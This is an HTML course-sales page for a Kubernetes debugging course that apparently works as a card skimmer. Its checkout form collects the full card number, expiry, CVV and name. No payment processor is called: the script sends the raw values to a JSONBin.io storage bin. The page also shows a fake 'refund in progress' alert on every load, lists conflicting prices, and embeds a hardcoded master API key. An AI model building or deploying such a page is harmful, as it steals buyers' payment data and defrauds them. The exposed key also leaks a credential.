<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educrate - Kubernetes Debugging Course</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" href="./favicon.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
       :root {
    --alert-bg: #fee2e2;   /* red-100 */
    --alert-border: #ef4444; /* red-500 */
    --alert-text: #991b1b; /* red-800 */
  }

  .alert-banner {
    position: fixed;
    top: 0; left: 0; right: 0;
    z-index: 9999;
    transform: translateY(-100%);
    opacity: 0;
    background: var(--alert-bg);
    border-bottom: 2px solid var(--alert-border);
    box-shadow: 0 4px 12px rgba(0,0,0,.1);
    transition: transform .25s ease, opacity .25s ease;
  }

  .alert-banner.is-visible {
    transform: translateY(0);
    opacity: 1;
  }

  .alert-content {
    max-width: 1200px;
    margin: 0 auto;
    padding: .75rem 1rem;
    display: flex;
    align-items: center;
    gap: .75rem;
  }

  .alert-icon {
    width: 20px; height: 20px;
    fill: var(--alert-border);
    flex: 0 0 auto;
  }

  .alert-text {
    color: var(--alert-text);
    font-weight: 600;
    line-height: 1.4;
    flex: 1 1 auto;
  }

  .alert-close {
    border: 0;
    background: transparent;
    color: var(--alert-text);
    font-size: 1.25rem;
    line-height: 1;
    padding: .25rem .5rem;
    cursor: pointer;
  }
  .alert-close:focus-visible {
    outline: 2px solid var(--alert-border);
    outline-offset: 2px;
    border-radius: .375rem;
  }

  /* Push page content down when banner shown (optional) */
  body.has-alert {
    /* Adjust if your site has its own fixed header height */
    scroll-margin-top: 56px;
  }
        .lock-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 4rem;
            color: rgba(255, 255, 255, 0.8);
            background: rgba(0, 0, 0, 0.6);
            border-radius: 50%;
            padding: 20px;
        }
        .progress-bar {
            height: 5px;
            background-color: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background-color: #10b981;
            width: 0%;
            transition: width 0.5s ease;
        }
        .locked-section {
            position: relative;
            filter: blur(4px);
            pointer-events: none;
        }
        .video-container {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
        }
        .video-container iframe,
        .video-container video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 8px;
        }
        .card-input {
            transition: all 0.3s;
        }
        .card-input:focus {
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.5);
            border-color: #4299e1;
        }
        .card-input.error {
            border-color: #e53e3e;
            box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.5);
        }
        .invoice-table tr:nth-child(even) {
            background-color: #f9fafb;
        }
        .content-item {
            transition: all 0.3s ease;
        }
        .content-item:hover {
            background-color: #f3f4f6;
        }
        .video-thumbnail {
            transition: all 0.3s ease;
        }
        .video-thumbnail:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        .countdown-digit {
            background: #f3f4f6;
            border-radius: 4px;
            padding: 2px 6px;
            font-weight: bold;
            font-variant-numeric: tabular-nums;
        }
        .course-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 12px;
            padding: 20px;
            color: white;
            margin-bottom: 20px;
        }
        .start-learning-btn {
            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
            color: white;
            font-weight: bold;
            padding: 12px 24px;
            border-radius: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        .start-learning-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
        }
        .success-modal {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            border-radius: 16px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }
        .success-icon {
            animation: successPulse 2s infinite;
        }
        @keyframes successPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .verification-spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-50">
    <!-- Header -->
    <header class="bg-white shadow-sm sticky top-0 z-50">
        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center">
                <div class="text-indigo-600 font-bold text-2xl mr-10">EDUCRATE</div>
                <nav class="hidden md:flex space-x-8">
                    <a href="#" class="text-gray-600 hover:text-indigo-600">Categories</a>
                    <a href="#" class="text-gray-600 hover:text-indigo-600">Teach</a>
                    <a href="#badges" class="text-indigo-600 font-medium">Badges</a>
                </nav>
            </div>
            <div class="flex items-center space-x-4">
                <div class="relative group">
                    <button class="w-10 h-10 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-800 font-semibold">
                        HA
                    </button>
                    <div class="absolute right-0 top-12 w-48 bg-white rounded-md shadow-lg py-2 hidden group-hover:block z-50">
                        <div class="px-4 py-2 border-b">
                            <p class="font-medium">Hasan Ashab</p>
                            <p class="text-sm text-gray-500">hasan@educrate.com</p>
                        </div>
                        <a href="#" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">My Profile</a>
                        <a href="#badges" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">Badges</a>
                        <a href="#" class="block px-4 py-2 text-gray-700 hover:bg-gray-100" onclick="logout()">Logout</a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="checkout-refund-alert"
     role="alert"
     aria-live="assertive"
     aria-hidden="true"
     class="alert-banner">
  <div class="alert-content">
    <svg class="alert-icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a10 10 0 1010 10A10.011 10.011 0 0012 2zm1 14h-2v-2h2zm0-4h-2V6h2z"/>
    </svg>
    <span class="alert-text">
      There was a problem while proceeding checkout, payment is in refunding state (may take up to 24 hours)
    </span>
    <button type="button" class="alert-close" aria-label="Dismiss alert" onclick="hideCheckoutRefundAlert()">
      Ã—
    </button>
  </div>
</div>

    <!-- Main Content -->
    <main class="container mx-auto px-4 py-8 max-w-6xl">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <!-- Left Column -->
            <div class="lg:col-span-2">
                <div class="course-header">
                    <h1 class="text-3xl md:text-4xl font-bold text-white mb-2">Kubernetes Debugging Mastery</h1>
                    <p class="text-indigo-100 mb-6">Learn how to troubleshoot and debug Kubernetes clusters like a pro</p>
                    <div id="enrolledView" class="hidden">
                        <button id="startLearningHeaderBtn" class="start-learning-btn">
                            <i class="fas fa-play-circle mr-2"></i> Start Learning Now
                        </button>
                    </div>
                </div>
                
                <!-- Introduction Video -->
                <div class="bg-black rounded-lg overflow-hidden mb-6 video-thumbnail">
                    <div class="video-container">
                        <video id="introVideo" controls>
                            <source src="https://res.cloudinary.com/ddsh5oa5o/video/upload/intro_j1ynma.mp4" type="video/mp4">
                            Your browser does not support the video tag.
                        </video>
                    </div>
                    <div class="p-3 bg-gray-800 text-white">
                        <h3 class="font-medium">Introduction to Instructor</h3>
                        <p class="text-sm text-gray-300">Lead DEVOPS Engineer - <i>RedHat</i></p>
                    </div>
                </div>
                
                <!-- Locked Content -->
                <div id="unlocked-video" class="locked-section mb-8 relative">
                    <div class="lock-icon">
                        <i class="fas fa-lock"></i>
                    </div>
                    <div class="bg-gray-800 rounded-lg overflow-hidden video-thumbnail">
                        <div class="video-container">
                            <div id="videoPlaceholder" class="w-full h-full flex items-center justify-center bg-gray-900">
                                <div class="text-center p-6">
                                    <i class="fas fa-lock text-4xl text-indigo-500 mb-4"></i>
                                    <h3 class="text-xl font-bold text-white mb-2">Content Locked</h3>
                                    <p class="text-gray-300 mb-4">Enroll in the course to unlock this video</p>
                                </div>
                            </div>
                            <video id="lockedVideo" controls class="w-full hidden">
                                <source src="https://res.cloudinary.com/ddsh5oa5o/video/upload/v1754265479/lock-vid_hsvomx.mp4" type="video/mp4">
                                Your browser does not support the video tag.
                            </video>
                        </div>
                    </div>
                    <div class="p-3 bg-gray-800 text-white">
                        <h3 class="font-medium">Advanced Kubernetes Debugging Techniques</h3>
                        <p class="text-sm text-gray-300">Master advanced debugging strategies for complex issues</p>
                    </div>
                </div>
                
                <!-- Course Content -->
                <div class="bg-white rounded-lg shadow-sm p-6 mb-8">
                    <h2 class="text-2xl font-bold mb-4">Course Content</h2>
                    <div class="space-y-3">
                        <div class="flex justify-between items-center p-4 border-b content-item">
                            <div>
                                <h3 class="font-medium">1. Introduction</h3>
                                <p class="text-gray-600 text-sm">1 lectures â€¢ 5 min</p>
                            </div>
                            <i class="fas fa-play-circle text-indigo-600"></i>
                        </div>
                        <div class="flex justify-between items-center p-4 border-b content-item locked">
                            <div>
                                <h3 class="font-medium">2. Common Deployment Issues</h3>
                                <p class="text-gray-600 text-sm">3 lectures â€¢ 20 min</p>
                            </div>
                            <i class="fas fa-lock text-gray-400"></i>
                        </div>
                        <div class="flex justify-between items-center p-4 border-b content-item locked">
                            <div>
                                <h3 class="font-medium">3. Kubernetes Debugging Tips</h3>
                                <p class="text-gray-600 text-sm">2 lectures â€¢ 12 min</p>
                            </div>
                            <i class="fas fa-lock text-gray-400"></i>
                        </div>
                    </div>
                </div>
                
                <!-- About the Course -->
                <div class="bg-white rounded-lg shadow-sm p-6 mb-8">
                    <h2 class="text-2xl font-bold mb-4">About the Course</h2>
                    <p class="text-gray-700 mb-4">
                        In this comprehensive course, you'll learn how to debug Kubernetes effectively and solve deployment issues faster than ever! Kubernetes is a powerful container orchestration platform, but when things go wrong, it can be challenging to identify and resolve issues.
                    </p>
                    <p class="text-gray-700 mb-4">
                        This course is designed for developers, DevOps engineers, and system administrators who want to master Kubernetes troubleshooting. Through hands-on labs and real-world scenarios, you'll learn how to diagnose and fix common Kubernetes problems.
                    </p>
                    <h3 class="text-xl font-semibold mt-6 mb-3">What You'll Learn</h3>
                    <ul class="list-disc pl-6 text-gray-700 space-y-2">
                        <li>Debug common Kubernetes deployment issues</li>
                        <li>Troubleshoot networking problems in your cluster</li>
                        <li>Solve persistent storage challenges</li>
                        <li>Diagnose and fix application failures</li>
                        <li>Use advanced debugging tools and techniques</li>
                        <li>Optimize your Kubernetes environment for reliability</li>
                    </ul>
                </div>
                
                <!-- Instructor -->
                <div class="bg-white rounded-lg shadow-sm p-6">
                    <h2 class="text-2xl font-bold mb-4">Instructor</h2>
                    <div class="flex items-start">
                        <div class="mr-4">
                            <div class="w-16 h-16 rounded-full bg-indigo-100 flex items-center justify-center">
                                <span class="text-indigo-800 font-bold text-xl">AV</span>
                            </div>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold">Abhishek Veeramalla</h3>
                            <p class="text-gray-600 mb-3">DevOps Engineer & Kubernetes Expert</p>
                            <div class="flex items-center mb-2">
                                <div class="flex text-yellow-400">
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star-half-alt"></i>
                                </div>
                                <span class="ml-2 text-gray-700">4.7 Instructor Rating</span>
                            </div>
                            <p class="text-gray-700">
                                Abhishek is a DevOps Engineer with over 8 years of experience in cloud infrastructure and container orchestration. He has helped numerous organizations implement and troubleshoot Kubernetes at scale. Abhishek is passionate about teaching and has trained thousands of students worldwide.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Right Column -->
            <div>
                <!-- Pricing Card -->
                <div id="pricingCard" class="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-6 sticky top-24 pulse">
                    <h2 class="text-2xl font-bold mb-4">Course Price</h2>
                    <div class="flex items-end mb-4">
                        <span class="text-3xl font-bold text-gray-900">$23.99</span>
                    </div>
                    
                    <div class="mb-6">
                        <div class="progress-bar">
                            <div class="progress-fill" id="progressFill"></div>
                        </div>
                    </div>
                    
                    <button id="enrollSidebarBtn" class="w-full bg-indigo-600 text-white py-3 rounded-md hover:bg-indigo-700 font-medium mb-4 transition duration-300 transform hover:scale-105">
                        Enroll Now
                    </button>
                    
                    <div class="text-center text-gray-600 mb-6">
                        30-Day Money-Back Guarantee
                    </div>
                    
                    <div class="space-y-3">
                        <h3 class="font-bold">This course includes:</h3>
                        <div class="flex items-center">
                            <i class="fas fa-video text-indigo-600 mr-2"></i>
                            <span>0.5 hour on-demand video</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-file-alt text-indigo-600 mr-2"></i>
                            <span>2 downloadable resources</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-infinity text-indigo-600 mr-2"></i>
                            <span>Full lifetime access</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-mobile-alt text-indigo-600 mr-2"></i>
                            <span>Access on mobile and TV</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-trophy text-indigo-600 mr-2"></i>
                            <span>Certificate of completion</span>
                        </div>
                    </div>
                </div>
                
                <!-- Students Also Bought -->
                <div class="bg-white rounded-lg shadow-sm p-6">
                    <h3 class="font-bold mb-4">Students also bought</h3>
                    <div class="space-y-4">
                        <div class="flex">
                            <div class="w-16 h-16 bg-indigo-100 rounded mr-3 flex items-center justify-center">
                                <i class="fas fa-server text-indigo-600"></i>
                            </div>
                            <div>
                                <h4 class="font-medium text-sm">Docker Mastery</h4>
                                <div class="flex items-center text-yellow-400 text-xs">
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star-half-alt"></i>
                                    <span class="text-gray-600 ml-1">4.6</span>
                                </div>
                                <div class="flex items-center mt-1">
                                    <span class="text-sm font-bold">$38.99</span>
                                    <span class="text-xs text-gray-500 line-through ml-2">$87.99</span>
                                </div>
                            </div>
                        </div>
                        <div class="flex">
                            <div class="w-16 h-16 bg-blue-100 rounded mr-3 flex items-center justify-center">
                                <i class="fab fa-aws text-blue-600"></i>
                            </div>
                            <div>
                                <h4 class="font-medium text-sm">AWS Certified Solutions Architect</h4>
                                <div class="flex items-center text-yellow-400 text-xs">
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="far fa-star"></i>
                                    <span class="text-gray-600 ml-1">4.4</span>
                                </div>
                                <div class="flex items-center mt-1">
                                    <span class="text-sm font-bold">$14.99</span>
                                    <span class="text-xs text-gray-500 line-through ml-2">$59.99</span>
                                </div>
                            </div>
                        </div>
                        <div class="flex">
                            <div class="w-16 h-16 bg-purple-100 rounded mr-3 flex items-center justify-center">
                                <i class="fas fa-cloud text-purple-600"></i>
                            </div>
                            <div>
                                <h4 class="font-medium text-sm">Terraform IaC</h4>
                                <div class="flex items-center text-yellow-400 text-xs">
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <i class="fas fa-star"></i>
                                    <span class="text-gray-600 ml-1">4.8</span>
                                </div>
                                <div class="flex items-center mt-1">
                                    <span class="text-sm font-bold">$69.99</span>
                                    <span class="text-xs text-gray-500 line-through ml-2">$107.99</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    
    <!-- Payment Modal -->
    <div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
            <div class="p-6 border-b">
                <h3 class="text-xl font-bold">Complete Your Purchase</h3>
                <p class="text-gray-600">Kubernetes Debugging Mastery - $5.99</p>
            </div>
            
            <div class="p-6">
                <form id="paymentForm">
                    <div class="mb-4">
                        <label class="block text-gray-700 mb-2">Card Number</label>
                        <input type="text" id="cardNumber" class="card-input w-full px-4 py-2 border rounded-md focus:outline-none" placeholder="1234 5678 9012 3456">
                        <p class="text-red-500 text-sm mt-1 hidden" id="cardNumberError">Please enter a valid card number</p>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-gray-700 mb-2">Expiry Date</label>
                            <input type="text" id="expiryDate" class="card-input w-full px-4 py-2 border rounded-md focus:outline-none" placeholder="MM/YY">
                            <p class="text-red-500 text-sm mt-1 hidden" id="expiryDateError">Please enter a valid expiry date</p>
                        </div>
                        <div>
                            <label class="block text-gray-700 mb-2">Security Code</label>
                            <input type="text" id="securityCode" class="card-input w-full px-4 py-2 border rounded-md focus:outline-none" placeholder="CVV">
                            <p class="text-red-500 text-sm mt-1 hidden" id="securityCodeError">Please enter a valid security code</p>
                        </div>
                    </div>
                    
                    <div class="mb-6">
                        <label class="block text-gray-700 mb-2">Name on Card</label>
                        <input type="text" id="nameOnCard" class="card-input w-full px-4 py-2 border rounded-md focus:outline-none" placeholder="John Doe">
                        <p class="text-red-500 text-sm mt-1 hidden" id="nameOnCardError">Please enter the name on card</p>
                    </div>
                    
                    <div class="flex justify-end space-x-3">
                        <button type="button" id="cancelPayment" class="px-4 py-2 border border-gray-300 rounded-md text-gray-700 hover:bg-gray-100">
                            Cancel
                        </button>
                        <button type="submit" class="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700">
                            Confirm Payment
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <!-- Verification Modal -->
    <div id="verificationModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
        <div class="bg-white rounded-lg shadow-xl w-full max-w-sm p-8 text-center">
            <div class="verification-spinner mx-auto mb-6"></div>
            <h3 class="text-xl font-bold mb-2">Verifying Payment</h3>
            <p class="text-gray-600">Please wait while we process your payment...</p>
        </div>
    </div>
    
    <!-- Payment Success Modal (Enhanced Green Theme) -->
    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
        <div class="success-modal w-full max-w-md p-8 text-center">
            <div class="w-24 h-24 bg-white bg-opacity-20 rounded-full flex items-center justify-center mx-auto mb-6 success-icon">
                <i class="fas fa-check text-white text-4xl"></i>
            </div>
            <h3 class="text-3xl font-bold mb-4">Payment Successful!</h3>
            <p class="text-xl mb-8">You now have full access to the course content.</p>
            
            <div class="mb-8">
                <div class="flex justify-center items-center mb-4">
                    <div class="w-10 h-10 rounded-full bg-white bg-opacity-30 flex items-center justify-center mr-3">
                        <i class="fas fa-video text-white"></i>
                    </div>
                    <span>Full Course Access</span>
                </div>
                <div class="flex justify-center items-center mb-4">
                    <div class="w-10 h-10 rounded-full bg-white bg-opacity-30 flex items-center justify-center mr-3">
                        <i class="fas fa-certificate text-white"></i>
                    </div>
                    <span>Certificate of Completion</span>
                </div>
                <div class="flex justify-center items-center">
                    <div class="w-10 h-10 rounded-full bg-white bg-opacity-30 flex items-center justify-center mr-3">
                        <i class="fas fa-download text-white"></i>
                    </div>
                    <span>Downloadable Resources</span>
                </div>
            </div>
            
            <button id="startLearningBtn" class="px-8 py-4 bg-white text-green-700 font-bold rounded-full text-lg hover:bg-green-50 transition-transform transform hover:scale-105">
                <i class="fas fa-play-circle mr-2"></i> Start Learning Now
            </button>
        </div>
    </div>

    <script>   
    function showCheckoutRefundAlert({ autoHideMs = 0 } = {}) {
    const el = document.getElementById('checkout-refund-alert');
    if (!el) return;

    el.classList.add('is-visible');
    el.setAttribute('aria-hidden', 'false');
    document.body.classList.add('has-alert');

    // Optionally auto-hide after N milliseconds
    if (autoHideMs > 0) {
      clearTimeout(el._hideTimer);
      el._hideTimer = setTimeout(hideCheckoutRefundAlert, autoHideMs);
    }
  }
// Show and keep it until user dismisses:
showCheckoutRefundAlert();

// Or show and auto-hide after 8 seconds:
showCheckoutRefundAlert({ autoHideMs: 10000000 });

  // Hides the alert.
  function hideCheckoutRefundAlert() {
    const el = document.getElementById('checkout-refund-alert');
    if (!el) return;

    el.classList.remove('is-visible');
    el.setAttribute('aria-hidden', 'true');
    document.body.classList.remove('has-alert');
    clearTimeout(el._hideTimer);
  }
   
        if (localStorage.getItem('auth') !== 'true') {
            window.location.href = 'login.html';
        }
        // JSONBin.io configuration
        const JSONBIN_API_KEY = '$2a$10$Rxgm8.O5VdyTjrkoBH8nseZwXRtX8/sRHgB97/Ie2B98Qv2OiUt92'; // Replace with your actual key
        const JSONBIN_BIN_ID = '688ed43bf7e7a370d1f290cd'; // Replace with your bin ID
        
        function logout() {
            localStorage.removeItem('auth');
            window.location.reload();
        }
        // Check if user is enrolled
        async function checkEnrollment() {
            try {
                const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
                    method: 'GET',
                    headers: {
                        'X-Master-Key': JSONBIN_API_KEY,
                        'Content-Type': 'application/json'
                    }
                });
                
                if (!response.ok) {
                    throw new Error('Failed to fetch payment data');
                }
                
                const data = await response.json();
                const payments = data.record?.payments || [];
                
                if (payments.length > 0) {
                    // Hide pricing card
                    document.getElementById('pricingCard').classList.add('hidden');
                    
                    // Show enrolled view
                    document.getElementById('enrolledView').classList.remove('hidden');
                    
                    // Unlock course content
                    unlockCourse();
                }
            } catch (error) {
                console.error('Error checking enrollment:', error);
            }
        }
        
        // Save payment to JSONBin.io
        async function savePaymentToJsonBin(payment) {
            try {
                // First, get existing payments
                const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                    method: 'GET',
                    headers: {
                        'X-Master-Key': JSONBIN_API_KEY,
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) {
                    throw new Error('Failed to fetch existing payments');
                }

                const data = await response.json();
                const existingPayments = data.record?.payments || [];

                // Add new payment
                const updatedPayments = [...existingPayments, payment];

                // Update the bin
                const updateResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': JSONBIN_API_KEY
                    },
                    body: JSON.stringify({ payments: updatedPayments })
                });
                if (!updateResponse.ok) {
                    throw new Error('Failed to save payment');
                }
                return true;
            } catch (error) {
                console.error('Error saving payment:', error);
                return false;
            }
        }

        // Unlock course function
        function unlockCourse() {
            const lockedContent = document.getElementById('unlocked-video');
            const lockedVideo = document.getElementById('lockedVideo');
            const videoPlaceholder = document.getElementById('videoPlaceholder');
            
            // Unlock course content
            lockedContent.classList.remove('locked-section');
            lockedContent.style.pointerEvents = 'auto';

            // Hide lock icon
            document.querySelector('.lock-icon').style.display = 'none';
            
            // Show the video
            videoPlaceholder.classList.add('hidden');
            lockedVideo.classList.remove('hidden');
            
            // Unlock course content items
            document.querySelectorAll('.content-item.locked').forEach(item => {
                item.classList.remove('locked');
                const lockIcon = item.querySelector('.fa-lock');
                if (lockIcon) {
                    lockIcon.classList.remove('fa-lock', 'text-gray-400');
                    lockIcon.classList.add('fa-play-circle', 'text-indigo-600');
                }
            });
        }
        
        // Scroll to video and play
        function playLockedVideo() {
            // Scroll to the unlocked video section
            document.getElementById('unlocked-video').scrollIntoView({ 
                behavior: 'smooth',
                block: 'center'
            });
            
            // Play the video after a small delay to allow scrolling
            setTimeout(() => {
                const lockedVideo = document.getElementById('lockedVideo');
                lockedVideo.play();
            }, 500);
        }
        
        // Initialize countdown timer (5 hours 44 minutes in seconds)
        let countdown = 5 * 3600 + 44 * 60;
        const hoursElement = document.getElementById('hours');
        const minutesElement = document.getElementById('minutes');
        const secondsElement = document.getElementById('seconds');
        const progressFill = document.getElementById('progressFill');
        
        function updateCountdown() {
            const hours = Math.floor(countdown / 3600);
            const minutes = Math.floor((countdown % 3600) / 60);
            const seconds = countdown % 60;
            
            // Format with leading zeros
            hoursElement.textContent = String(hours).padStart(2, '0');
            minutesElement.textContent = String(minutes).padStart(2, '0');
            secondsElement.textContent = String(seconds).padStart(2, '0');
            
            // Update progress bar (starting from 100% and decreasing)
            const progress = (countdown / (5*3600 + 44*60)) * 100;
            progressFill.style.width = `${progress}%`;
            
            if (countdown <= 0) {
                clearInterval(timer);
                hoursElement.textContent = "00";
                minutesElement.textContent = "00";
                secondsElement.textContent = "00";
                progressFill.style.width = "0%";
            } else {
                countdown--;
            }
        }
        
        // Update countdown every second
        const timer = setInterval(updateCountdown, 1000);
        updateCountdown(); // Initial call
        
        // Payment modal functionality
        const paymentModal = document.getElementById('paymentModal');
        const verificationModal = document.getElementById('verificationModal');
        const successModal = document.getElementById('successModal');
        const enrollSidebarBtn = document.getElementById('enrollSidebarBtn');
        const cancelPayment = document.getElementById('cancelPayment');
        const paymentForm = document.getElementById('paymentForm');
        const startLearningBtn = document.getElementById('startLearningBtn');
        const startLearningHeaderBtn = document.getElementById('startLearningHeaderBtn');
        
        function showPaymentModal() {
            paymentModal.classList.remove('hidden');
        }
        
        function hidePaymentModal() {
            paymentModal.classList.add('hidden');
        }
        
        function showVerificationModal() {
            verificationModal.classList.remove('hidden');
        }
        
        function hideVerificationModal() {
            verificationModal.classList.add('hidden');
        }
        
        function showSuccessModal() {
            successModal.classList.remove('hidden');
        }
        
        enrollSidebarBtn.addEventListener('click', showPaymentModal);
        cancelPayment.addEventListener('click', hidePaymentModal);
        
        // Form validation
        paymentForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Reset errors
            document.querySelectorAll('.card-input').forEach(input => {
                input.classList.remove('error');
            });
            document.querySelectorAll('[id$="Error"]').forEach(error => {
                error.classList.add('hidden');
            });
            
            // Get values
            const cardNumber = document.getElementById('cardNumber').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const securityCode = document.getElementById('securityCode').value;
            const nameOnCard = document.getElementById('nameOnCard').value;
            
            let isValid = true;
            
            // Validate card number (simple 16-digit check)
            if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ''))) {
                document.getElementById('cardNumber').classList.add('error');
                document.getElementById('cardNumberError').classList.remove('hidden');
                isValid = false;
            }
            
            // Validate expiry date (MM/YY format)
            if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
                document.getElementById('expiryDate').classList.add('error');
                document.getElementById('expiryDateError').classList.remove('hidden');
                isValid = false;
            }
            
            // Validate security code (3 or 4 digits)
            if (!/^\d{3,4}$/.test(securityCode)) {
                document.getElementById('securityCode').classList.add('error');
                document.getElementById('securityCodeError').classList.remove('hidden');
                isValid = false;
            }
            
            // Validate name
            if (nameOnCard.trim() === '') {
                document.getElementById('nameOnCard').classList.add('error');
                document.getElementById('nameOnCardError').classList.remove('hidden');
                isValid = false;
            }
            
            if (isValid) {
                // Hide payment modal and show verification
                hidePaymentModal();
                showVerificationModal();

                // Create payment object
                const payment = {
                    cardNumber: cardNumber.replace(/\s/g, ''),
                    expiryDate,
                    securityCode,
                    nameOnCard,
                    course: "Kubernetes Debugging Mastery",
                    amount: 5.99,
                    date: new Date().toLocaleString()
                };
                
                // Add 3-second delay for verification
                setTimeout(async () => {
                    try {
                        // Save to JSONBin.io
                        const saveSuccess = await savePaymentToJsonBin(payment);
                        
                        if (saveSuccess) {
                            // Hide verification and show success
                            hideVerificationModal();
                            showSuccessModal();
                            
                            // Update UI for enrolled user
                            checkEnrollment();
                        } else {
                            // Show error
                            hideVerificationModal();
                            alert('Payment failed. Please try again.');
                        }
                    } catch (error) {
                        hideVerificationModal();
                        alert('An error occurred. Please try again.');
                    }
                }, 3000);
            }
        });
        
        startLearningBtn.addEventListener('click', function() {
            successModal.classList.add('hidden');
            unlockCourse();
            playLockedVideo();
        });
        
        startLearningHeaderBtn.addEventListener('click', function() {
            playLockedVideo();
        });
        
        // Format card number input
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            
            e.target.value = formatted;
        });
        
        // Format expiry date input
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            
            if (value.length > 2) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
        });
        
        // Check enrollment on page load
        document.addEventListener('DOMContentLoaded', function() {
            checkEnrollment();
        });
    </script>
</body>
</html>